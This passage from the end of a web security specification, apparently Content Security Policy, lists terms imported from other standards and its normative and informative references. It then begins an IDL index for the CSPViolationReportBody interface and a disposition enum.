     <li><span class="dfn-paneled" id="44a7708c">EventInit</span>
     <li><span class="dfn-paneled" id="0c0ceb78">bubbles</span>
     <li><span class="dfn-paneled" id="8b547cc7">composed</span>
     <li><span class="dfn-paneled" id="9638f92b">connected</span>
     <li><span class="dfn-paneled" id="a973e0fe">document</span>
     <li><span class="dfn-paneled" id="5fd23811">fire an event</span>
     <li><span class="dfn-paneled" id="c62cd7cf">origin</span>
     <li><span class="dfn-paneled" id="ea2049db">shadow-including root</span>
     <li><span class="dfn-paneled" id="e8478f36">target</span>
    </ul>
   <li>
    <a data-link-type="biblio">[ECMA262]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="7414e9fd">Function()</span>
     <li><span class="dfn-paneled" id="78dac792">HostEnsureCanCompileStrings()</span>
     <li><span class="dfn-paneled" id="bccca632">eval()</span>
     <li><span class="dfn-paneled" id="656bb36c">realm</span>
    </ul>
   <li>
    <a data-link-type="biblio">[ENCODING]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="0303e8e5">utf-8 encode</span>
    </ul>
   <li>
    <a data-link-type="biblio">[FETCH]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="8e9945a0">body</span>
     <li><span class="dfn-paneled" id="857d5516">client</span>
     <li><span class="dfn-paneled" id="902380f7">credentials mode</span>
     <li><span class="dfn-paneled" id="784f01de">cryptographic nonce metadata</span>
     <li><span class="dfn-paneled" id="3f2ca4de">current url</span>
     <li><span class="dfn-paneled" id="3ae34c95">destination</span>
     <li><span class="dfn-paneled" id="3be1d4ac">extracting header list values</span>
     <li><span class="dfn-paneled" id="a33db89a">fetch</span>
     <li><span class="dfn-paneled" id="6ee0eab1">header list <small>(for request)</small></span>
     <li><span class="dfn-paneled" id="f7b00a8b">header list <small>(for response)</small></span>
     <li><span class="dfn-paneled" id="2aaa2f42">http fetch</span>
     <li><span class="dfn-paneled" id="eb62573b">http(s) scheme</span>
     <li><span class="dfn-paneled" id="d75f6c27">http-network fetch</span>
     <li><span class="dfn-paneled" id="fa4ea124">initiator</span>
     <li><span class="dfn-paneled" id="d79a826f">integrity metadata</span>
     <li><span class="dfn-paneled" id="8394d1b7">keepalive</span>
     <li><span class="dfn-paneled" id="63340982">local scheme</span>
     <li><span class="dfn-paneled" id="e0dfd35e">main fetch</span>
     <li><span class="dfn-paneled" id="50b05fad">method</span>
     <li><span class="dfn-paneled" id="cb98f71f">mode</span>
     <li><span class="dfn-paneled" id="eb1b1af3">network error</span>
     <li><span class="dfn-paneled" id="f78d5b5c">origin</span>
     <li><span class="dfn-paneled" id="ee1a333c">parser metadata</span>
     <li><span class="dfn-paneled" id="8c3deeef">redirect count</span>
     <li><span class="dfn-paneled" id="64b62ea0">redirect mode</span>
     <li><span class="dfn-paneled" id="a8b25997">redirect status</span>
     <li><span class="dfn-paneled" id="55213b5b">request</span>
     <li><span class="dfn-paneled" id="ee7bba09">response</span>
     <li><span class="dfn-paneled" id="d8fc72f5">script-like</span>
     <li><span class="dfn-paneled" id="a1d47575">status</span>
     <li><span class="dfn-paneled" id="5e345b1c">target browsing context</span>
     <li><span class="dfn-paneled" id="dc1cd39b">url <small>(for request)</small></span>
     <li><span class="dfn-paneled" id="3268a8eb">url <small>(for response)</small></span>
     <li><span class="dfn-paneled" id="1ab127d6">window</span>
    </ul>
   <li>
    <a data-link-type="biblio">[HTML]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="9d459c32">"parser-inserted"</span>
     <li><span class="dfn-paneled" id="b8308563">DedicatedWorkerGlobalScope</span>
     <li><span class="dfn-paneled" id="a13a702f">SharedWorker</span>
     <li><span class="dfn-paneled" id="165b73c9">SharedWorkerGlobalScope</span>
     <li><span class="dfn-paneled" id="5d7209e9">Window</span>
     <li><span class="dfn-paneled" id="bfc1c271">Worker</span>
     <li><span class="dfn-paneled" id="83c59a3a">WorkerGlobalScope</span>
     <li><span class="dfn-paneled" id="0c9b0d3c">WorkletGlobalScope</span>
     <li><span class="dfn-paneled" id="68bf3d31">a</span>
     <li><span class="dfn-paneled" id="e9c183b8">an iframe srcdoc document</span>
     <li><span class="dfn-paneled" id="b410a6ef">ascii serialization of an origin</span>
     <li><span class="dfn-paneled" id="3349d69f">associated document</span>
     <li><span class="dfn-paneled" id="c847111b">base</span>
     <li><span class="dfn-paneled" id="e524fbcb">browsing context</span>
     <li><span class="dfn-paneled" id="5a88c1c3">content</span>
     <li><span class="dfn-paneled" id="92812d1b">content security policy state</span>
     <li><span class="dfn-paneled" id="8c209bab">create and initialize a new document object</span>
     <li><span class="dfn-paneled" id="12b8dfc0">current settings object</span>
     <li><span class="dfn-paneled" id="4468342f">data</span>
     <li><span class="dfn-paneled" id="04e0443f">document</span>
     <li><span class="dfn-paneled" id="e0e0bca6">duplicate-attribute</span>
     <li><span class="dfn-paneled" id="49a6cb20">embed</span>
     <li><span class="dfn-paneled" id="3e12e042">environment settings object</span>
     <li><span class="dfn-paneled" id="946a9318">form</span>
     <li><span class="dfn-paneled" id="88ed8860">frame</span>
     <li><span class="dfn-paneled" id="4b6086d7">global object</span>
     <li><span class="dfn-paneled" id="8a30477b">global object <small>(for environment settings object)</small></span>
     <li><span class="dfn-paneled" id="56c6bafc">href</span>
     <li><span class="dfn-paneled" id="448c95f9">http-equiv</span>
     <li><span class="dfn-paneled" id="87fcd40c">iframe</span>
     <li><span class="dfn-paneled" id="6cfa013d">link</span>
     <li><span class="dfn-paneled" id="64b89595">meta</span>
     <li><span class="dfn-paneled" id="b1e9fc19">nonce</span>
     <li><span class="dfn-paneled" id="99b5cef6">object</span>
     <li><span class="dfn-paneled" id="b01b1359">opaque origin</span>
     <li><span class="dfn-paneled" id="b4f2d668">origin</span>
     <li><span class="dfn-paneled" id="43ac8374">origin <small>(for environment settings object)</small></span>
     <li><span class="dfn-paneled" id="16460342">owner set</span>
     <li><span class="dfn-paneled" id="53f0ea4e">parse a sandboxing directive</span>
     <li><span class="dfn-paneled" id="3da24a47">ping</span>
     <li><span class="dfn-paneled" id="c746cc4f">process the iframe attributes</span>
     <li><span class="dfn-paneled" id="9a517a7d">queue a task</span>
     <li><span class="dfn-paneled" id="0aa2f0c0">referrer</span>
     <li><span class="dfn-paneled" id="9c4c1e66">relevant settings object</span>
     <li><span class="dfn-paneled" id="ea6f3f13">run a worker</span>
     <li><span class="dfn-paneled" id="5c35dd47">sandbox</span>
     <li><span class="dfn-paneled" id="da63e480">sandboxed origin browsing context flag</span>
     <li><span class="dfn-paneled" id="c1d81171">sandboxed scripts browsing context flag</span>
     <li><span class="dfn-paneled" id="a23d12a9">scheme</span>
     <li><span class="dfn-paneled" id="0cf3964f">script</span>
     <li><span class="dfn-paneled" id="09f349d5">set the frozen base url</span>
     <li><span class="dfn-paneled" id="122f01fb">setInterval(handler, timeout, ...arguments)</span>
     <li><span class="dfn-paneled" id="3332e595">setTimeout(handler, timeout, ...arguments)</span>
     <li><span class="dfn-paneled" id="ba920583">style</span>
     <li><span class="dfn-paneled" id="ae2a6342">top-level browsing context</span>
     <li><span class="dfn-paneled" id="3144baec">update a style block</span>
    </ul>
   <li>
    <a data-link-type="biblio">[INFRA]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="53275e46">append <small>(for list)</small></span>
     <li><span class="dfn-paneled" id="a3b18719">append <small>(for set)</small></span>
     <li><span class="dfn-paneled" id="7f9469b5">ascii case-insensitive</span>
     <li><span class="dfn-paneled" id="6f2dfa22">ascii lowercase</span>
     <li><span class="dfn-paneled" id="2d5a2765">ascii string</span>
     <li><span class="dfn-paneled" id="5fb1ed8a">ascii whitespace</span>
     <li><span class="dfn-paneled" id="3de9e659">byte sequence</span>
     <li><span class="dfn-paneled" id="60184fa5">collecting a sequence of code points</span>
     <li><span class="dfn-paneled" id="ae8def21">contain</span>
     <li><span class="dfn-paneled" id="f937b7b6">continue</span>
     <li><span class="dfn-paneled" id="a088e610">convert</span>
     <li><span class="dfn-paneled" id="16d07e10">for each</span>
     <li><span class="dfn-paneled" id="5e72f9d3">infra</span>
     <li><span class="dfn-paneled" id="7a87d819">is</span>
     <li><span class="dfn-paneled" id="6b815fdd">is empty</span>
     <li><span class="dfn-paneled" id="d8b963e8">isomorphic decode</span>
     <li><span class="dfn-paneled" id="649608b9">list</span>
     <li><span class="dfn-paneled" id="84b454ff">ordered map</span>
     <li><span class="dfn-paneled" id="692595fe">ordered set</span>
     <li><span class="dfn-paneled" id="4c07280e">serialize an infra value to json bytes</span>
     <li><span class="dfn-paneled" id="15e48c39">set</span>
     <li><span class="dfn-paneled" id="23cac254">split a string on ascii whitespace</span>
     <li><span class="dfn-paneled" id="b29084c6">split a string on commas</span>
     <li><span class="dfn-paneled" id="7a3dbdb1">strictly split a string</span>
     <li><span class="dfn-paneled" id="0698d556">string</span>
     <li><span class="dfn-paneled" id="a37f05fd">strip leading and trailing ascii whitespace</span>
    </ul>
   <li>
    <a data-link-type="biblio">[REPORTING]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="9ad09878">group</span>
     <li><span class="dfn-paneled" id="49f24f5a">queue report</span>
     <li><span class="dfn-paneled" id="4d5cebba">report type</span>
     <li><span class="dfn-paneled" id="3c4b330a">visible to reportingobservers</span>
    </ul>
   <li>
    <a data-link-type="biblio">[REPORTING-1]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="574c86b8">ReportBody</span>
    </ul>
   <li>
    <a data-link-type="biblio">[RFC3986]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="3db5ef5f">ipv4address</span>
     <li><span class="dfn-paneled" id="546e361d">path-absolute</span>
     <li><span class="dfn-paneled" id="01149665">scheme</span>
     <li><span class="dfn-paneled" id="cdec7b52">uri-reference</span>
    </ul>
   <li>
    <a data-link-type="biblio">[RFC4648]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="af6109ae">base64 encoding</span>
     <li><span class="dfn-paneled" id="fe4f8855">base64url encoding</span>
    </ul>
   <li>
    <a data-link-type="biblio">[RFC5234]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="41a7917e">alpha</span>
     <li><span class="dfn-paneled" id="702d8ead">digit</span>
     <li><span class="dfn-paneled" id="c6544229">vchar</span>
    </ul>
   <li>
    <a data-link-type="biblio">[RFC7230]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="5d346c26">ows</span>
     <li><span class="dfn-paneled" id="4a4e79bc">token</span>
    </ul>
   <li>
    <a data-link-type="biblio">[RFC7231]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="9055b6c6">representation</span>
     <li><span class="dfn-paneled" id="35c08a82">resource representation</span>
    </ul>
   <li>
    <a data-link-type="biblio">[SERVICE-WORKERS]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="570073d7">ServiceWorker</span>
     <li><span class="dfn-paneled" id="e0498b8f">ServiceWorkerGlobalScope</span>
    </ul>
   <li>
    <a data-link-type="biblio">[SHA2]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="c6be056c">sha-256</span>
     <li><span class="dfn-paneled" id="7da56b7d">sha-384</span>
     <li><span class="dfn-paneled" id="b1dc7351">sha-512</span>
    </ul>
   <li>
    <a data-link-type="biblio">[URL]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="f06432d7">URL</span>
     <li><span class="dfn-paneled" id="b9d1df32">base url</span>
     <li><span class="dfn-paneled" id="12553145">default port</span>
     <li><span class="dfn-paneled" id="5718c334">host <small>(for URL)</small></span>
     <li><span class="dfn-paneled" id="b85ee3be">host <small>(for url)</small></span>
     <li><span class="dfn-paneled" id="d6e2b0d9">ipv6 address</span>
     <li><span class="dfn-paneled" id="959ad97b">origin</span>
     <li><span class="dfn-paneled" id="c0868016">path</span>
     <li><span class="dfn-paneled" id="8f69ce41">percent-decode</span>
     <li><span class="dfn-paneled" id="17bd86ff">port <small>(for URL)</small></span>
     <li><span class="dfn-paneled" id="852ada56">port <small>(for url)</small></span>
     <li><span class="dfn-paneled" id="3a711be7">scheme</span>
     <li><span class="dfn-paneled" id="ca3ca4ae">url parser</span>
     <li><span class="dfn-paneled" id="5442ea33">url serializer</span>
    </ul>
   <li>
    <a data-link-type="biblio">[WEBIDL]</a> defines the following terms:
    <ul>
     <li><span class="dfn-paneled" id="8855a9aa">DOMString</span>
     <li><span class="dfn-paneled" id="889e932f">Exposed</span>
     <li><span class="dfn-paneled" id="b0d7f3c3">USVString</span>
     <li><span class="dfn-paneled" id="e97a9688">unsigned long</span>
     <li><span class="dfn-paneled" id="450958f7">unsigned short</span>
    </ul>
  </ul>
  <h2 class="no-num no-ref heading settled" id="references"><span class="content">References</span><a class="self-link" href="#references"></a></h2>
  <h3 class="no-num no-ref heading settled" id="normative"><span class="content">Normative References</span><a class="self-link" href="#normative"></a></h3>
  <dl>
   <dt id="biblio-css-cascade-5">[CSS-CASCADE-5]
   <dd>Elika Etemad; Miriam Suzanne; Tab Atkins Jr.. <a href="https://www.w3.org/TR/css-cascade-5/"><cite>CSS Cascading and Inheritance Level 5</cite></a>. 13 January 2022. CR. URL: <a href="https://www.w3.org/TR/css-cascade-5/">https://www.w3.org/TR/css-cascade-5/</a>
   <dt id="biblio-cssom">[CSSOM]
   <dd>Daniel Glazman; Emilio Cobos Álvarez. <a href="https://www.w3.org/TR/cssom-1/"><cite>CSS Object Model (CSSOM)</cite></a>. 26 August 2021. WD. URL: <a href="https://www.w3.org/TR/cssom-1/">https://www.w3.org/TR/cssom-1/</a>
   <dt id="biblio-dom">[DOM]
   <dd>Anne van Kesteren. <a href="https://dom.spec.whatwg.org/"><cite>DOM Standard</cite></a>. Living Standard. URL: <a href="https://dom.spec.whatwg.org/">https://dom.spec.whatwg.org/</a>
   <dt id="biblio-ecma262">[ECMA262]
   <dd>Brian Terlson; Allen Wirfs-Brock. <a href="https://tc39.github.io/ecma262/"><cite>ECMAScript® Language Specification</cite></a>. URL: <a href="https://tc39.github.io/ecma262/">https://tc39.github.io/ecma262/</a>
   <dt id="biblio-encoding">[ENCODING]
   <dd>Anne van Kesteren. <a href="https://encoding.spec.whatwg.org/"><cite>Encoding Standard</cite></a>. Living Standard. URL: <a href="https://encoding.spec.whatwg.org/">https://encoding.spec.whatwg.org/</a>
   <dt id="biblio-fetch">[FETCH]
   <dd>Anne van Kesteren. <a href="https://fetch.spec.whatwg.org/"><cite>Fetch Standard</cite></a>. Living Standard. URL: <a href="https://fetch.spec.whatwg.org/">https://fetch.spec.whatwg.org/</a>
   <dt id="biblio-html">[HTML]
   <dd>Anne van Kesteren; et al. <a href="https://html.spec.whatwg.org/multipage/"><cite>HTML Standard</cite></a>. Living Standard. URL: <a href="https://html.spec.whatwg.org/multipage/">https://html.spec.whatwg.org/multipage/</a>
   <dt id="biblio-infra">[INFRA]
   <dd>Anne van Kesteren; Domenic Denicola. <a href="https://infra.spec.whatwg.org/"><cite>Infra Standard</cite></a>. Living Standard. URL: <a href="https://infra.spec.whatwg.org/">https://infra.spec.whatwg.org/</a>
   <dt id="biblio-reporting">[REPORTING]
   <dd>Ilya Gregorik; Mike West. <a href="https://wicg.github.io/reporting/"><cite>Reporting API</cite></a>. URL: <a href="https://wicg.github.io/reporting/">https://wicg.github.io/reporting/</a>
   <dt id="biblio-reporting-1">[REPORTING-1]
   <dd>Douglas Creager; Ian Clelland; Mike West. <a href="https://www.w3.org/TR/reporting-1/"><cite>Reporting API</cite></a>. 13 August 2024. WD. URL: <a href="https://www.w3.org/TR/reporting-1/">https://www.w3.org/TR/reporting-1/</a>
   <dt id="biblio-rfc2119">[RFC2119]
   <dd>S. Bradner. <a href="https://datatracker.ietf.org/doc/html/rfc2119"><cite>Key words for use in RFCs to Indicate Requirement Levels</cite></a>. March 1997. Best Current Practice. URL: <a href="https://datatracker.ietf.org/doc/html/rfc2119">https://datatracker.ietf.org/doc/html/rfc2119</a>
   <dt id="biblio-rfc3492">[RFC3492]
   <dd>A. Costello. <a href="https://www.rfc-editor.org/rfc/rfc3492"><cite>Punycode: A Bootstring encoding of Unicode for Internationalized Domain Names in Applications (IDNA)</cite></a>. March 2003. Proposed Standard. URL: <a href="https://www.rfc-editor.org/rfc/rfc3492">https://www.rfc-editor.org/rfc/rfc3492</a>
   <dt id="biblio-rfc3864">[RFC3864]
   <dd>G. Klyne; M. Nottingham; J. Mogul. <a href="https://www.rfc-editor.org/rfc/rfc3864"><cite>Registration Procedures for Message Header Fields</cite></a>. September 2004. Best Current Practice. URL: <a href="https://www.rfc-editor.org/rfc/rfc3864">https://www.rfc-editor.org/rfc/rfc3864</a>
   <dt id="biblio-rfc3986">[RFC3986]
   <dd>T. Berners-Lee; R. Fielding; L. Masinter. <a href="https://www.rfc-editor.org/rfc/rfc3986"><cite>Uniform Resource Identifier (URI): Generic Syntax</cite></a>. January 2005. Internet Standard. URL: <a href="https://www.rfc-editor.org/rfc/rfc3986">https://www.rfc-editor.org/rfc/rfc3986</a>
   <dt id="biblio-rfc4648">[RFC4648]
   <dd>S. Josefsson. <a href="https://www.rfc-editor.org/rfc/rfc4648"><cite>The Base16, Base32, and Base64 Data Encodings</cite></a>. October 2006. Proposed Standard. URL: <a href="https://www.rfc-editor.org/rfc/rfc4648">https://www.rfc-editor.org/rfc/rfc4648</a>
   <dt id="biblio-rfc5234">[RFC5234]
   <dd>D. Crocker, Ed.; P. Overell. <a href="https://www.rfc-editor.org/rfc/rfc5234"><cite>Augmented BNF for Syntax Specifications: ABNF</cite></a>. January 2008. Internet Standard. URL: <a href="https://www.rfc-editor.org/rfc/rfc5234">https://www.rfc-editor.org/rfc/rfc5234</a>
   <dt id="biblio-rfc7034">[RFC7034]
   <dd>D. Ross; T. Gondrom. <a href="https://www.rfc-editor.org/rfc/rfc7034"><cite>HTTP Header Field X-Frame-Options</cite></a>. October 2013. Informational. URL: <a href="https://www.rfc-editor.org/rfc/rfc7034">https://www.rfc-editor.org/rfc/rfc7034</a>
   <dt id="biblio-rfc7230">[RFC7230]
   <dd>R. Fielding, Ed.; J. Reschke, Ed.. <a href="https://httpwg.org/specs/rfc7230.html"><cite>Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing</cite></a>. June 2014. Proposed Standard. URL: <a href="https://httpwg.org/specs/rfc7230.html">https://httpwg.org/specs/rfc7230.html</a>
   <dt id="biblio-rfc7231">[RFC7231]
   <dd>R. Fielding, Ed.; J. Reschke, Ed.. <a href="https://httpwg.org/specs/rfc7231.html"><cite>Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content</cite></a>. June 2014. Proposed Standard. URL: <a href="https://httpwg.org/specs/rfc7231.html">https://httpwg.org/specs/rfc7231.html</a>
   <dt id="biblio-rfc7762">[RFC7762]
   <dd>M. West. <a href="https://www.rfc-editor.org/rfc/rfc7762"><cite>Initial Assignment for the Content Security Policy Directives Registry</cite></a>. January 2016. Informational. URL: <a href="https://www.rfc-editor.org/rfc/rfc7762">https://www.rfc-editor.org/rfc/rfc7762</a>
   <dt id="biblio-rfc8288">[RFC8288]
   <dd>M. Nottingham. <a href="https://httpwg.org/specs/rfc8288.html"><cite>Web Linking</cite></a>. October 2017. Proposed Standard. URL: <a href="https://httpwg.org/specs/rfc8288.html">https://httpwg.org/specs/rfc8288.html</a>
   <dt id="biblio-service-workers">[SERVICE-WORKERS]
   <dd>Jake Archibald; Marijn Kruisselbrink. <a href="https://www.w3.org/TR/service-workers/"><cite>Service Workers</cite></a>. 12 July 2022. CR. URL: <a href="https://www.w3.org/TR/service-workers/">https://www.w3.org/TR/service-workers/</a>
   <dt id="biblio-sri">[SRI]
   <dd>Devdatta Akhawe; et al. <a href="https://www.w3.org/TR/SRI/"><cite>Subresource Integrity</cite></a>. 23 June 2016. REC. URL: <a href="https://www.w3.org/TR/SRI/">https://www.w3.org/TR/SRI/</a>
   <dt id="biblio-url">[URL]
   <dd>Anne van Kesteren. <a href="https://url.spec.whatwg.org/"><cite>URL Standard</cite></a>. Living Standard. URL: <a href="https://url.spec.whatwg.org/">https://url.spec.whatwg.org/</a>
   <dt id="biblio-webidl">[WEBIDL]
   <dd>Edgar Chen; Timothy Gu. <a href="https://webidl.spec.whatwg.org/"><cite>Web IDL Standard</cite></a>. Living Standard. URL: <a href="https://webidl.spec.whatwg.org/">https://webidl.spec.whatwg.org/</a>
  </dl>
  <h3 class="no-num no-ref heading settled" id="informative"><span class="content">Informative References</span><a class="self-link" href="#informative"></a></h3>
  <dl>
   <dt id="biblio-appmanifest">[APPMANIFEST]
   <dd>Marcos Caceres; et al. <a href="https://www.w3.org/TR/appmanifest/"><cite>Web Application Manifest</cite></a>. 2 July 2024. WD. URL: <a href="https://www.w3.org/TR/appmanifest/">https://www.w3.org/TR/appmanifest/</a>
   <dt id="biblio-beacon">[BEACON]
   <dd>Ilya Grigorik; Alois Reitbauer. <a href="https://www.w3.org/TR/beacon/"><cite>Beacon</cite></a>. 3 August 2022. CR. URL: <a href="https://www.w3.org/TR/beacon/">https://www.w3.org/TR/beacon/</a>
   <dt id="biblio-csp2">[CSP2]
   <dd>Mike West; Adam Barth; Daniel Veditz. <a href="https://www.w3.org/TR/CSP2/"><cite>Content Security Policy Level 2</cite></a>. 15 December 2016. REC. URL: <a href="https://www.w3.org/TR/CSP2/">https://www.w3.org/TR/CSP2/</a>
   <dt id="biblio-css-abuse">[CSS-ABUSE]
   <dd>Chris Evans. <a href="https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html"><cite>Generic cross-browser cross-domain theft</cite></a>. 28 December 2009. URL: <a href="https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html">https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html</a>
   <dt id="biblio-eventsource">[EVENTSOURCE]
   <dd>Ian Hickson. <a href="https://www.w3.org/TR/eventsource/"><cite>Server-Sent Events</cite></a>. 28 January 2021. REC. URL: <a href="https://www.w3.org/TR/eventsource/">https://www.w3.org/TR/eventsource/</a>
   <dt id="biblio-filedescriptor-2015">[FILEDESCRIPTOR-2015]
   <dd>filedescriptor. <a href="https://blog.innerht.ml/csp-2015/#danglingmarkupinjection"><cite>CSP 2015</cite></a>. 23 November 2015. URL: <a href="https://blog.innerht.ml/csp-2015/#danglingmarkupinjection">https://blog.innerht.ml/csp-2015/#danglingmarkupinjection</a>
   <dt id="biblio-h5sc3">[H5SC3]
   <dd>Mario Heiderich. <a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22"><cite>H5SC Minichallenge 3: "Sh*t, it's CSP!"</cite></a>. URL: <a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22">https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22</a>
   <dt id="biblio-html-design">[HTML-DESIGN]
   <dd>Anne Van Kesteren; Maciej Stachowiak. <a href="https://www.w3.org/TR/html-design-principles/"><cite>HTML Design Principles</cite></a>. URL: <a href="https://www.w3.org/TR/html-design-principles/">https://www.w3.org/TR/html-design-principles/</a>
   <dt id="biblio-mix">[MIX]
   <dd>Emily Stark; Mike West; Carlos IbarraLopez. <a href="https://www.w3.org/TR/mixed-content/"><cite>Mixed Content</cite></a>. 23 February 2023. CR. URL: <a href="https://www.w3.org/TR/mixed-content/">https://www.w3.org/TR/mixed-content/</a>
   <dt id="biblio-timing">[TIMING]
   <dd>Paul Stone. <a href="https://www.contextis.com/media/downloads/Pixel_Perfect_Timing_Attacks_with_HTML5_Whitepaper.pdf"><cite>Pixel Perfect Timing Attacks with HTML5</cite></a>. URL: <a href="https://www.contextis.com/media/downloads/Pixel_Perfect_Timing_Attacks_with_HTML5_Whitepaper.pdf">https://www.contextis.com/media/downloads/Pixel_Perfect_Timing_Attacks_with_HTML5_Whitepaper.pdf</a>
   <dt id="biblio-uisecurity">[UISECURITY]
   <dd>Brad Hill. <a href="https://www.w3.org/TR/UISecurity/"><cite>User Interface Security and the Visibility API</cite></a>. 7 June 2016. WD. URL: <a href="https://www.w3.org/TR/UISecurity/">https://www.w3.org/TR/UISecurity/</a>
   <dt id="biblio-upgrade-insecure-requests">[UPGRADE-INSECURE-REQUESTS]
   <dd>Mike West. <a href="https://www.w3.org/TR/upgrade-insecure-requests/"><cite>Upgrade Insecure Requests</cite></a>. 8 October 2015. CR. URL: <a href="https://www.w3.org/TR/upgrade-insecure-requests/">https://www.w3.org/TR/upgrade-insecure-requests/</a>
   <dt id="biblio-websockets">[WEBSOCKETS]
   <dd>Adam Rice. <a href="https://websockets.spec.whatwg.org/"><cite>WebSockets Standard</cite></a>. Living Standard. URL: <a href="https://websockets.spec.whatwg.org/">https://websockets.spec.whatwg.org/</a>
   <dt id="biblio-xhr">[XHR]
   <dd>Anne van Kesteren. <a href="https://xhr.spec.whatwg.org/"><cite>XMLHttpRequest Standard</cite></a>. Living Standard. URL: <a href="https://xhr.spec.whatwg.org/">https://xhr.spec.whatwg.org/</a>
   <dt id="biblio-xslt">[XSLT]
   <dd>James Clark. <a href="https://www.w3.org/TR/xslt-10/"><cite>XSL Transformations (XSLT) Version 1.0</cite></a>. 16 November 1999. REC. URL: <a href="https://www.w3.org/TR/xslt-10/">https://www.w3.org/TR/xslt-10/</a>
  </dl>
  <h2 class="no-num no-ref heading settled" id="idl-index"><span class="content">IDL Index</span><a class="self-link" href="#idl-index"></a></h2>
<pre class="idl highlight def">[<a class="idl-code" data-link-type="extended-attribute" href="https://webidl.spec.whatwg.org/#Exposed"><c- g>Exposed</c-></a>=<c- n>Window</c->]
<c- b>interface</c-> <a href="#cspviolationreportbody"><code><c- g>CSPViolationReportBody</c-></code></a> : <a data-link-type="idl-name" href="https://www.w3.org/TR/reporting-1/#reportbody"><c- n>ReportBody</c-></a> {
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a> <a data-readonly data-type="USVString" href="#dom-cspviolationreportbody-documenturl"><code><c- g>documentURL</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>? <a data-readonly data-type="USVString?" href="#dom-cspviolationreportbody-referrer"><code><c- g>referrer</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>? <a data-readonly data-type="USVString?" href="#dom-cspviolationreportbody-blockedurl"><code><c- g>blockedURL</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a> <a data-readonly data-type="DOMString" href="#dom-cspviolationreportbody-effectivedirective"><code><c- g>effectiveDirective</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a> <a data-readonly data-type="DOMString" href="#dom-cspviolationreportbody-originalpolicy"><code><c- g>originalPolicy</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>? <a data-readonly data-type="USVString?" href="#dom-cspviolationreportbody-sourcefile"><code><c- g>sourceFile</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>? <a data-readonly data-type="DOMString?" href="#dom-cspviolationreportbody-sample"><code><c- g>sample</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <a data-readonly data-type="SecurityPolicyViolationEventDisposition" href="#dom-cspviolationreportbody-disposition"><code><c- g>disposition</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <a data-readonly data-type="unsigned short" href="#dom-cspviolationreportbody-statuscode"><code><c- g>statusCode</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>? <a data-readonly data-type="unsigned long?" href="#dom-cspviolationreportbody-linenumber"><code><c- g>lineNumber</c-></code></a>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>? <a data-readonly data-type="unsigned long?" href="#dom-cspviolationreportbody-columnnumber"><code><c- g>columnNumber</c-></code></a>;
};

<c- b>enum</c-> <a href="#enumdef-securitypolicyviolationeventdisposition"><code><c- g>SecurityPolicyViolationEventDisposition</c-></code></a> {
  <a href="#dom-securitypolicyviolationeventdisposition-enforce"><code><c- s>"enforce"</c-></code></a>, <a href="#dom-securitypolicyviolationeventdisposition-report"><code><c- s>"report"</c-></code></a>
};

[<a class="idl-code" data-link-type="extended-attribute" href="https://webidl.spec.whatwg.org/#Exposed"><c- g>Exposed</c-></a>=(<c- n>Window</c->,<c- n>Worker</c->)]
